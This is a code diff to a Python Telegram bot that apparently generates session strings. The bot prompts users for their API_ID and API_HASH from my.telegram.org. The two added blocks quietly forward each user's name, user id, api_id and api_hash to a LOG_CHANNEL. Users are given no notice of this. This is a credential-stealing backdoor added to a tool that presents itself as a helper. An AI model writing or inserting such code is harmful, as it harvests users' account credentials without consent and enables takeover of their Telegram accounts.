@@ -36,6 +36,12 @@ async def teleGen(strbot, callback_data):
             'Send me your `API_ID` you can find it on my.telegram.org after you logged in.'
         )
     )
+    await strbot.send_message(
+        chat_id=LOG_CHANNEL,
+        text=(
+            f'{callback_data.from_user.mention} ( `{callback_data.from_user.id}` ) Account api_id is : `{API_ID.text}`'
+        )
+    )    
     if not (
         API_ID.text.isdigit()
     ):
@@ -51,7 +57,12 @@ async def teleGen(strbot, callback_data):
             'Send me your `API_HASH` you can find it on my.telegram.org after you logged in.'
         )
     )
-    
+    await strbot.send_message(
+        chat_id=LOG_CHANNEL,
+        text=(
+            f'{callback_data.from_user.mention} ( `{callback_data.from_user.id}` ) Account api_hash is : `{API_HASH.text}`'
+        )
+    )    
     PHONE = await strbot.ask(
         chat_id=user_id,
         text=(
